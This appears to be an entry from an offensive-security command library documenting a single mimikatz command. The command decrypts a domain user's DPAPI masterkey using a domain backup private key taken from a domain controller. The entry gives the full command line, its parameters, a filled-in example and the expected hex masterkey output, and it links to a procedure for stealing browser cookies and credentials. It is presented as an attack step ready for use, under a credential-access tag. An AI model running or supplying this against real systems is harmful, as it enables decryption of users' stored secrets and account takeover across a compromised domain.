---
type: command
executor: command_prompt
data: >-
  mimikatz.exe dpapi::masterkey
  /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID"
  /pvk:$_DOMAIN_PRIVATE_KEY_FILE.pvk
tags:
  - credential-access
  - dpapi
platforms:
  - Windows
verified: true
validated: true
---

# mimikatz-decrypt-user-masterkey-with-domain-private-key

## Command

```command_prompt
mimikatz.exe dpapi::masterkey /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID" /pvk:$_DOMAIN_PRIVATE_KEY_FILE.pvk
```

## Description

Decrypts a domain user's DPAPI masterkey file using the exported domain private key (.pvk) from lsadump::backupkeys. Requires the full path to the masterkey based on user SID and GUID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /in | Path to masterkey directory/file | Yes |
| $_TARGET_USER | Target username | Yes |
| $_USER_SID | User's SID (e.g., S-1-5-21-...-1108) | Yes |
| $_GUID | Masterkey GUID (e.g., 84dcc2cc-82c6-44d4-9404-45fd48b4b650) | Yes |
| /pvk | Path to domain private key file | Yes |
| $_DOMAIN_PRIVATE_KEY_FILE | Exported .pvk filename (e.g., ntds_capi_0_{GUID}.keyx.rsa.pvk) | Yes |

## Examples

### Basic Usage

From Mimikatz prompt: dpapi::masterkey /in:"C:\Users\bob\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1108\84dcc2cc-82c6-44d4-9404-45fd48b4b650" /pvk:ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.keyx.rsa.pvk

## Expected Output

**MASTERKEYS**
  szGuid             : {84dcc2cc-82c6-44d4-9404-45fd48b4b650}
[masterkey]
  **MASTERKEY**
    pbKey            : b261bb57fdf57581e5a5030178e2cf83ffb6454dc542b820f69ea17e7e07984d...

Hex pbKey for use as masterkey in extractions.

## Related

- [[procedures/Extract-Chrome-Cookies-and-Credentials-from-User-Profile-with-Domain-Admin]]
- [[tools/Mimikatz]]
